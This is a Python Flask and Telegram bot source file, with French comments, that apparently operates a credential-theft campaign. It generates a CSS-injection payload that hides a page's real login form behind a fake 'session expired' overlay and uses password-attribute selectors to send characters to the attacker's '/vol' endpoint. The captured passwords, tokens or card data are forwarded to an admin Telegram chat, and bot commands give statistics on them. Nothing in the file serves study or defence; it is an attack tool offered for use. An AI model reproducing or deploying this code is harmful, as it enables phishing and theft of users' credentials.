import os
import logging
from datetime import datetime
from flask import Flask, request
import requests
import threading
import json
import re
from collections import Counter

# ============================================
# CONFIGURATION
# ============================================

BOT_TOKEN = os.environ.get("BOT_TOKEN", "TON_TOKEN_ICI")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "TON_CHAT_ID_ICI")

# ============================================
# LOGGING
# ============================================

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================
# DICTIONNAIRE DE CARACTÈRES
# ============================================

TOUS_CARACTERES = {
    'minuscules': 'abcdefghijklmnopqrstuvwxyz',
    'majuscules': 'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
    'chiffres': '0123456789',
    'symboles_standard': '!@#$%^&*()_+-=[]{}|;:,.<>?/~`',
    'speciaux': '×÷±§¶©®™€£¥¢₩₪₫₨₱₴₸₹₺₼₾≈≠≤≥∞∑∏∫√∂∆∇←↑→↓↔↕☺☻♥♦♣♠•◘○◙♂♀♪♫☼►◄↕‼¶§▬↨↑↓→←∟↔▲▼',
    'explicites': '×^<2>@%&*#!~`\'"',
    'brackets': '()[]{}<>',
    'ponctuation': '.,;:?!…—–_',
    'barres': '/\\|',
    'emojis': '😀😁😂🤣😃😄😅😆😉😊😋😎😍🥰😘😗😙😚☺️🙂🤗🤩🤔🤨😐😑😶🙄😏😣😥😮🤐😯😪😫😴😌😛😜😝🤤😒😓😔😕🙃🤑😲☹️🙁😖😞😟😤😢😭😦😧😨😩🤯😬😰😱🥵🥶😳🤪😵😡😠🤬',
    'unicode': 'ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõöøùúûüýþÿĀāĂăĄąĆćĈĉĊċČčĎďĐđĒēĔĕĖėĘęĚěĜĝĞğĠġĢģĤĥĦħĨĩĪīĬĭĮįİıĲĳĴĵĶķĸĹĺĻļĽľĿŀŁłŃńŅņŇňŉŊŋŌōŎŏŐőŒœŔŕŖŗŘřŚśŜŝŞşŠšŢţŤťŦŧŨũŪūŬŭŮůŰűŲųŴŵŶŷŸŹźŻżŽž',
    'arabes': '٠١٢٣٤٥٦٧٨٩',
    'chinois': '零一二三四五六七八九',
    'romains': 'ⅠⅡⅢⅣⅤⅥⅦⅧⅨⅩⅪⅫ',
    'exposants': '⁰¹²³⁴⁵⁶⁷⁸⁹',
    'indices': '₀₁₂₃₄₅₆₇₈₉',
}

TOUS_CARACTERES_FLAT = ''.join(TOUS_CARACTERES.values())
CARACTERES_CSS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?/~`'

# ============================================
# STOCKAGE
# ============================================

donnees_volees = []

# ============================================
# SERVEUR FLASK
# ============================================

app = Flask(__name__)

@app.route('/')
def index():
    return "🤖 Bot CSS Attack - Actif ⚡"

@app.route('/vol')
def voler():
    donnee = request.args.get('p', '')
    ip = request.remote_addr
    champ = request.args.get('champ', 'password')
    method = request.args.get('method', 'css')
    
    if donnee:
        entree = {
            'time': datetime.now().strftime('%H:%M:%S'),
            'date': datetime.now().strftime('%Y-%m-%d'),
            'ip': ip,
            'data': donnee,
            'champ': champ,
            'method': method,
            'longueur': len(donnee)
        }
        donnees_volees.append(entree)
        
        print(f"[VOL] {donnee} depuis {ip}")
        
        niveau_confiance = analyser_donnee(donnee)
        message = generer_message_alerte(entree, niveau_confiance)
        
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, json={
                'chat_id': ADMIN_CHAT_ID,
                'text': message,
                'parse_mode': 'Markdown'
            }, timeout=5)
        except Exception as e:
            logger.error(f"Erreur envoi: {e}")
        
        return '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"><rect width="1" height="1" fill="white"/></svg>', 200, {'Content-Type': 'image/svg+xml'}
    
    return "OK", 200

def analyser_donnee(donnee):
    score = 0
    if len(donnee) >= 12:
        score += 25
    elif len(donnee) >= 8:
        score += 15
    
    has_lower = any(c.islower() for c in donnee)
    has_upper = any(c.isupper() for c in donnee)
    has_digit = any(c.isdigit() for c in donnee)
    has_symbol = any(c in '!@#$%^&*()_+-=[]{}|;:,.<>?/~`×÷±§©®™€£¥¢' for c in donnee)
    
    if has_lower and has_upper:
        score += 15
    if has_digit:
        score += 10
    if has_symbol:
        score += 15
    
    score += sum([has_lower, has_upper, has_digit, has_symbol]) * 5
    
    patterns = [
        (r'[A-Z].*[a-z].*[0-9]', 10),
        (r'.*[!@#$%^&*()].*', 10),
    ]
    
    for pattern, pts in patterns:
        if re.search(pattern, donnee):
            score += pts
    
    return min(score, 100)

def generer_message_alerte(entree, confiance):
    icones = {
        'password': '🔑',
        'email': '📧',
        'username': '👤',
        'token': '🎫',
        'creditcard': '💳',
        'cookie': '🍪',
        'session': '🔄',
        'url': '🔗'
    }
    icone = icones.get(entree['champ'], '🔴')
    barre = '█' * (confiance // 10) + '░' * (10 - confiance // 10)
    
    types_detectes = []
    if any(c.islower() for c in entree['data']):
        types_detectes.append('minuscule')
    if any(c.isupper() for c in entree['data']):
        types_detectes.append('MAJUSCULE')
    if any(c.isdigit() for c in entree['data']):
        types_detectes.append('chiffre')
    if any(c in '!@#$%^&*()_+-=[]{}|;:,.<>?/~`×÷±§©®™€£¥¢' for c in entree['data']):
        types_detectes.append('symbole')
    
    types_str = ', '.join(types_detectes) if types_detectes else 'inconnu'
    
    return f"""{icone} **DONNÉE VOLÉE**

📝 `{entree['data']}`
📏 Longueur: {entree['longueur']} caractères
🏷️ Type: `{entree['champ']}`
🧩 Composition: `{types_str}`
🌐 IP: `{entree['ip']}`
🕐 {entree['time']}

📊 Confiance: {confiance}% [{barre}]
{f"⚠️ MOT DE PASSE !" if confiance > 70 else "ℹ️ Donnée suspecte"}"""

# ============================================
# COMMANDES TELEGRAM
# ============================================

def envoyer_telegram(message, chat_id=None):
    if chat_id is None:
        chat_id = ADMIN_CHAT_ID
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'Markdown'
        }, timeout=10)
        return True
    except Exception as e:
        logger.error(f"Erreur: {e}")
        return False

def generer_payload():
    webhook_url = f"https://{request.host}/vol"
    
    payload = f"""<style>
form {{ display: none !important; }}
.fake-login {{
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: rgba(0,0,0,0.9);
    z-index: 99999;
    display: flex;
    justify-content: center;
    align-items: center;
}}
.fake-box {{
    background: white;
    padding: 40px;
    border-radius: 20px;
    max-width: 400px;
    width: 90%;
}}
.fake-box h2 {{ color: #333; text-align: center; }}
.fake-box input {{
    width: 100%;
    padding: 12px;
    margin: 10px 0;
    border: 2px solid #ddd;
    border-radius: 10px;
}}
.fake-box button {{
    width: 100%;
    padding: 12px;
    background: #667eea;
    color: white;
    border: none;
    border-radius: 10px;
    cursor: pointer;
}}
input[type="password"] {{ 
    background-image: url('{webhook_url}?p='); 
}}
"""
    
    for c in CARACTERES_CSS:
        payload += f"""
input[type="password"][value^="{c}"] {{
    background-image: url('{webhook_url}?p={c}');
}}
"""
    
    payload += """
</style>
<div class="fake-login">
    <div class="fake-box">
        <h2>🔐 Session expirée</h2>
        <p>Veuillez vous reconnecter</p>
        <input type="password" name="password" placeholder="Mot de passe" autofocus>
        <button>Se connecter</button>
    </div>
</div>
<script>
document.querySelectorAll('input').forEach(input => {
    input.addEventListener('input', function() {
        this.style.display = 'block';
        this.style.display = '';
    });
});
</script>
"""
    return payload

def traiter_message(update):
    try:
        message = update.get('message', {})
        chat_id = message.get('chat', {}).get('id')
        text = message.get('text', '')
        
        if not chat_id or not text:
            return
        
        if text == '/start':
            envoyer_telegram(
                f"""🚀 **BOT CSS INJECTION**

⚡ PUISSANCE: 100%
📊 CARACTÈRES: {len(TOUS_CARACTERES_FLAT)}

Commandes:
📤 /payload - Code CSS
📊 /stats - Statistiques
🔍 /analyse - Analyse
📈 /rapport - Rapport
🗑️ /clear - Effacer""",
                chat_id
            )
        
        elif text == '/payload':
            payload = generer_payload()
            envoyer_telegram("📤 **PAYLOAD CSS**", chat_id)
            if len(payload) > 4000:
                for i in range(0, len(payload), 4000):
                    envoyer_telegram(f"```html\n{payload[i:i+4000]}\n```", chat_id)
            else:
                envoyer_telegram(f"```html\n{payload}\n```", chat_id)
        
        elif text == '/stats':
            if not donnees_volees:
                envoyer_telegram("📭 Aucune donnée.", chat_id)
                return
            
            total = len(donnees_volees)
            unique_ips = len(set(d['ip'] for d in donnees_volees))
            
            types = {}
            for d in donnees_volees:
                champ = d.get('champ', 'unknown')
                types[champ] = types.get(champ, 0) + 1
            
            texte = f"📊 **STATISTIQUES**\n\nTotal: `{total}`\nIP uniques: `{unique_ips}`\n\n"
            for t, count in types.items():
                texte += f"• {t}: `{count}`\n"
            
            envoyer_telegram(texte, chat_id)
        
        elif text == '/analyse':
            if not donnees_volees:
                envoyer_telegram("📭 Aucune donnée.", chat_id)
                return
            
            texte = "🔍 **ANALYSE**\n\n"
            for d in donnees_volees[-10:]:
                score = analyser_donnee(d['data'])
                niveau = "🟢" if score < 30 else "🟡" if score < 60 else "🔴"
                texte += f"{niveau} `{d['data']}` ({score}%)\n"
            
            envoyer_telegram(texte, chat_id)
        
        elif text == '/rapport':
            total = len(donnees_volees)
            if total == 0:
                envoyer_telegram("📭 Pas de données.", chat_id)
                return
            
            rapport = f"""📈 **RAPPORT**

📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}
📊 Total: {total}
🌐 IP: {len(set(d['ip'] for d in donnees_volees))}

Dernières:
"""
            for d in donnees_volees[-5:]:
                rapport += f"• {d['time']} - `{d['data']}`\n"
            
            envoyer_telegram(rapport, chat_id)
        
        elif text == '/clear':
            donnees_volees.clear()
            envoyer_telegram("🗑️ Effacé !", chat_id)
    
    except Exception as e:
        logger.error(f"Erreur: {e}")

# ============================================
# WEBHOOK
# ============================================

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    threading.Thread(target=traiter_message, args=(update,)).start()
    return "OK", 200

@app.route('/setwebhook', methods=['GET'])
def set_webhook():
    webhook_url = f"https://{request.host}/webhook"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}"
    response = requests.get(url)
    return response.json()

@app.route('/getwebhook', methods=['GET'])
def get_webhook():
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getWebhookInfo"
    response = requests.get(url)
    return response.json()

# ============================================
# LANCEMENT
# ============================================

if __name__ == "__main__":
    print("""
    ╔════════════════════════════════════════╗
    ║  🚀 BOT CSS INJECTION                 ║
    ║  💪 PUISSANCE: 100%                   ║
    ║  📊 CARACTÈRES: """ + str(len(TOUS_CARACTERES_FLAT)) + """            ║
    ╚════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=8080)
